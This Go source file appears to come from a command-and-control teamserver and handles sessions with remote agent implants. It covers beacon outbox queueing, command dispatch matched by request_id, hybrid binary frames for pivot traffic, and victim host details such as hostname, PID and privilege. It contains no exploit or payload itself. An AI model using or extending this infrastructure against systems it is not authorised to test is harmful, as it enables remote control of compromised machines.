package session

import (
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"time"

	"cleat/teamserver/internal/logx"
)

// MaxOutbox beacon 会话 outbox 容量上限。
const MaxOutbox = 256

// Info 返回会话的公开信息(供 API/事件)。
type Info struct {
	ID          int    `json:"id"`
	RemoteIP    string `json:"remote_ip"`
	Hostname    string `json:"hostname"`
	OS          string `json:"os"`
	CPU         string `json:"cpu"`
	Memory      string `json:"memory"`
	LocalIP     string `json:"local_ip"`
	PID         uint32 `json:"pid"`
	ProcessName string `json:"process_name"`
	Privilege   string `json:"privilege"`
	LastSeen    int64  `json:"last_seen"` // Unix 毫秒, 0=从未
	Online      bool   `json:"online"`
	// Transport 会话通道类型: tcp | https | http | dns | ws | pipe。
	// 空串 = 未知(Web 侧显示占位, 不再伪造 'tcp')。
	Transport string `json:"transport"`
}

// Info 构造会话公开信息。
func (s *Session) Info() Info {
	s.mu.Lock()
	defer s.mu.Unlock()
	r := s.Record
	info := Info{
		ID:          r.ID,
		RemoteIP:    r.RemoteIP,
		Hostname:    r.Hostname,
		OS:          joinOS(r.OS, r.OSVersion),
		CPU:         r.CPU,
		Memory:      r.Memory,
		LocalIP:     r.LocalIP,
		PID:         r.PID,
		ProcessName: r.ProcessName,
		Privilege:   r.Privilege,
		Online:      !r.Closed,
		Transport:   r.Transport,
	}
	if !r.LastSeen.IsZero() {
		info.LastSeen = r.LastSeen.UnixMilli()
	}
	return info
}

// joinOS 拼接系统名称与版本("Windows" + "Windows 10 10.0 (Build 19045)" → "Windows 10 10.0 (Build 19045)")。
// 空段忽略; 版本若已以名称开头(Agent 的 os_version 常含完整描述)则不重复拼接。
func joinOS(name, version string) string {
	if version == "" {
		return name
	}
	if name == "" {
		return version
	}
	if strings.HasPrefix(version, name) {
		return version
	}
	return name + " " + version
}

// sendFrame 写一帧 JSON(并发安全)。
// TCP 模式: 写连接; beacon 模式: 追加到 outbox(由 Agent GET/请求捎带走, 保证 FIFO 顺序)。
func (s *Session) sendFrame(body []byte) error {
	s.writeMu.Lock()
	defer s.writeMu.Unlock()
	if s.Record.IsClosed() {
		fmt.Printf("[SendFrame-Closed] sid=%d pid=%d\n", s.ID(), s.Record.PID)
		return errors.New("会话已关闭")
	}
	if s.Conn == nil {
		s.outboxMu.Lock()
		// 容量上限: Agent 停拉时曾无限 append → 内存单调
		// 膨胀(A3-13 sweeper 只管会话对象, 管不了活着但停拉的会话堆积的帧)。
		// **满 = 拒收新帧并报错, 绝不丢队首**: 队首可能是注册确认 confirm
		// (beacon.go 的 FIFO 承重结构), 丢了 Agent 永远拿不到 sid。
		// sendFrame 报错 → 任务派发按"未派发"回滚 pending → Agent 回来后补偿重试,
		// 语义自洽不丢任务。
		if len(s.outbox) >= MaxOutbox {
			s.outboxMu.Unlock()
			logx.Printf("[!] 会话 #%d outbox 已满(%d), 拒收新帧(Agent 未拉取)\n", s.ID(), MaxOutbox)
			return errors.New("outbox 已满: Agent 长时间未拉取")
		}
		s.outbox = append(s.outbox, body)
		s.outboxMu.Unlock()
		return nil
	}
	return s.Conn.WriteFrame(body)
}

// MarkBeacon 标记会话为 beacon 通道(无长连接 Conn, 出站帧进 outbox)。
func (s *Session) MarkBeacon() {
	s.mu.Lock()
	s.Conn = nil
	s.beacon = true
	s.mu.Unlock()
}

// IsBeacon 会话是否为 beacon 通道。
func (s *Session) IsBeacon() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.beacon
}

// PollOutbox 取出一条待 Agent 拉取的出站帧(TCP 模式恒返回 nil/false)。
// 用于 beacon listener 的 GET/DNS/ICMP 交互响应。返回帧后即从队列移除。
func (s *Session) PollOutbox() ([]byte, bool) {
	s.outboxMu.Lock()
	defer s.outboxMu.Unlock()
	if len(s.outbox) == 0 {
		return nil, false
	}
	frame := s.outbox[0]
	s.outbox = s.outbox[1:]
	return frame, true
}

// OutboxContainsRequestID 探测 outbox 中是否仍有指定 request_id 的帧
// (任务回滚分流用: 在 = 未取件可撤回; 不在 = 已交付, 不得重派)。
func (s *Session) OutboxContainsRequestID(rid string) bool {
	s.outboxMu.Lock()
	defer s.outboxMu.Unlock()
	for _, f := range s.outbox {
		if extractRequestID(f) == rid {
			return true
		}
	}
	return false
}

// RemoveOutboxByRequestID 从 outbox 撤回指定 request_id 的帧(任务超时回滚用)。
// 返回是否撤到。帧已交付(被取走)时撤不到 —— 调用方据此决定不重派(防双执行)。
func (s *Session) RemoveOutboxByRequestID(rid string) bool {
	s.outboxMu.Lock()
	defer s.outboxMu.Unlock()
	for i, f := range s.outbox {
		if extractRequestID(f) == rid {
			s.outbox = append(s.outbox[:i], s.outbox[i+1:]...)
			return true
		}
	}
	return false
}

// extractRequestID 从出站帧(JSON)解出 request_id; 混合帧经 SplitFrame 拆头,
// 不再自行截断(形状判定单点在 wire.go)。
func extractRequestID(frame []byte) string {
	header, _, err := SplitFrame(frame)
	if err != nil {
		return ""
	}
	var m struct {
		RequestID string `json:"request_id"`
	}
	if err := json.Unmarshal(header, &m); err != nil {
		return ""
	}
	return m.RequestID
}

// OutboxLen 返回待拉取出站帧数(诊断)。
func (s *Session) OutboxLen() int {
	s.outboxMu.Lock()
	defer s.outboxMu.Unlock()
	return len(s.outbox)
}

// dispatchAndWait 命令下发的唯一实现(节拍合一 S3.5: 响应匹配合一为 request_id 单一语义)。
// 构造标准命令帧 → sendFrame(TCP 直写连接 / beacon 入 outbox) → 挂 PendingResp →
// 按 request_id 等待响应。cmdMu 保证同一会话同时仅一条在途命令。
//
// 原 push/pull 双轨(RespChan FIFO "下一个到的就算你的" vs PendingResp 精确匹配)已合并:
// FIFO 匹配在 Agent 并发执行/响应乱序时会串话, request_id 是唯一可靠语义 ——
// 通信协议文档 早已写明"两路需合并为按 request_id 单一语义", 本改动即其落地。
func (s *Session) dispatchAndWait(cmd string, params map[string]interface{}) (map[string]interface{}, error) {
	s.cmdMu.Lock()
	defer s.cmdMu.Unlock()

	s.mu.Lock()
	if s.Record.IsClosed() {
		s.mu.Unlock()
		return nil, errors.New("会话已关闭")
	}
	s.mu.Unlock()

	if params == nil {
		params = make(map[string]interface{})
	}
	rid := fmt.Sprintf("req-%d-%d", s.ID(), time.Now().UnixNano())
	body, err := json.Marshal(map[string]interface{}{
		"cmd":        cmd,
		"params":     params,
		"request_id": rid,
		"ts":         time.Now().Unix(),
	})
	if err != nil {
		return nil, err
	}
	// **先挂 PendingResp, 再 sendFrame**: beacon 下帧入 outbox
	// 后, 另一个 HTTP goroutine(GET→Agent 执行→POST 回包)可能在注册完成前进入
	// handleOne —— 查无等待者即丢弃响应 → dispatchAndWait 空等 60s → 任务回滚重发。
	// 顺序换位后响应早到也能命中; sendFrame 失败时经 defer 清理注册。
	respCh := make(chan []byte, 1)
	s.pendingMu.Lock()
	s.PendingResp[rid] = respCh
	s.pendingMu.Unlock()
	defer func() {
		s.pendingMu.Lock()
		delete(s.PendingResp, rid)
		s.pendingMu.Unlock()
	}()

	if err := s.sendFrame(body); err != nil {
		return nil, err
	}

	select {
	case respData, ok := <-respCh:
		if !ok {
			return nil, errors.New("会话已关闭")
		}
		// 响应拆帧统一走 decodeResponse: 纯 JSON 响应原样; 混合帧响应(如截图)
		// 的二进制体以 __binary__ 挂顶层, 上层(Service.Command)提升
		return decodeResponse(respData)
	case <-time.After(RespTimeout):
		return nil, fmt.Errorf("命令响应超时(等待上限 %s): 会话可能正处于加密睡眠窗口(掩码)"+
			"或长轮询间隙 —— 命令可能仍将执行, 请查看任务列表(tasks)确认结果, 勿盲目重发", RespTimeout)
	}
}

// SendCommand 下发命令并等待响应(push 语义: TCP 直写连接, 会话关闭即失败)。
// 与 QueueCommand 已共用 dispatchAndWait —— 响应匹配唯一走 request_id,
// 原 RespChan FIFO 匹配("下一个到的就算你的", Agent 并发时会串话)删除。
func (s *Session) SendCommand(cmd string, params map[string]interface{}) (map[string]interface{}, error) {
	return s.dispatchAndWait(cmd, params)
}

// QueueCommand 下发命令并等待响应(pull 语义: beacon 入 outbox, 由 Agent GET/上传取件带出)。
// 历史形态(已删): 命令先入 CmdQueue, 由 Agent 上行 poll 帧(handlePoll→PopQueued)弹出,
// 再包一层 data.command 进 outbox —— 两跳 + 双队列 + PollResponse 特例帧, 全部消亡。
func (s *Session) QueueCommand(cmd string, params map[string]interface{}) (map[string]interface{}, error) {
	return s.dispatchAndWait(cmd, params)
}

// SendHybrid 发送携带二进制体的混合帧命令并等待响应(如文件上传分块)。
// 帧格式: JSON头 + '\0' + 原始二进制(协议)。
// 若 req 带 request_id，会原样回传给 Agent，确保响应按任务精确匹配。
func (s *Session) SendHybrid(req map[string]interface{}, bin []byte) (map[string]interface{}, error) {
	s.cmdMu.Lock()
	defer s.cmdMu.Unlock()

	if s.Record.IsClosed() {
		return nil, errors.New("会话已关闭")
	}
	if _, ok := req["cmd"]; !ok {
		return nil, errors.New("JSON 缺少 'cmd' 字段")
	}
	if _, ok := req["params"]; !ok {
		req["params"] = map[string]interface{}{}
	}
	if _, ok := req["request_id"]; !ok {
		req["request_id"] = fmt.Sprintf("req-%d-%d", s.ID(), time.Now().UnixNano())
	}
	head, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}
	// 装帧收口(BuildFrame): body_size 由实际体长恒写, 原"调用方补/不补"两态消亡。
	frame, err := BuildFrame(head, bin)
	if err != nil {
		return nil, err
	}
	// 响应匹配唯一走 request_id(节拍合一 S3.5): 调用方传入或上面补齐的 rid 原样回传。
	// **先挂 PendingResp 再 sendFrame**: beacon 下响应早到不丢(理由同 dispatchAndWait)。
	rid, _ := req["request_id"].(string)
	respCh := make(chan []byte, 1)
	s.pendingMu.Lock()
	s.PendingResp[rid] = respCh
	s.pendingMu.Unlock()
	defer func() {
		s.pendingMu.Lock()
		delete(s.PendingResp, rid)
		s.pendingMu.Unlock()
	}()

	if err := s.sendFrame(frame); err != nil {
		return nil, err
	}

	select {
	case respData, ok := <-respCh:
		if !ok {
			return nil, errors.New("会话已关闭")
		}
		return decodeResponse(respData)
	case <-time.After(RespTimeout):
		return nil, fmt.Errorf("命令响应超时(等待上限 %s): 会话可能正处于加密睡眠窗口(掩码)"+
			"或长轮询间隙 —— 命令可能仍将执行, 请查看任务列表(tasks)确认结果, 勿盲目重发", RespTimeout)
	}
}

// SendHybridPush 非阻塞下推一帧混合命令(JSON头 + '\0' + 二进制体), 不等响应。
// 用于 PivotData 数据透传: 高频推送, 若每次等响应会串行化且与在途命令抢锁。
// Agent 端 PivotDataHandler 会回 Ok —— 该响应带 request_id 但无人 pending,
// handleOne 直接丢弃(与原"落 RespChan 被 drain 清掉"的终局一致, 不再有 drain 步骤)。
func (s *Session) SendHybridPush(req map[string]interface{}, bin []byte) error {
	if s.Record.IsClosed() {
		return errors.New("会话已关闭")
	}
	if _, ok := req["cmd"]; !ok {
		return errors.New("JSON 缺少 'cmd' 字段")
	}
	if _, ok := req["params"]; !ok {
		req["params"] = map[string]interface{}{}
	}
	head, err := json.Marshal(req)
	if err != nil {
		return err
	}
	// 装帧收口(BuildFrame): 与 SendHybrid 同路 —— 原 Push 路径漏写 body_size
	// (与 SendHybrid 漂移), 恒写修复。
	frame, err := BuildFrame(head, bin)
	if err != nil {
		return err
	}
	return s.sendFrame(frame)
}

// (PopQueued 已随节拍合一 S3 删除: CmdQueue 消亡, 下行统一 outbox/连接直写。)
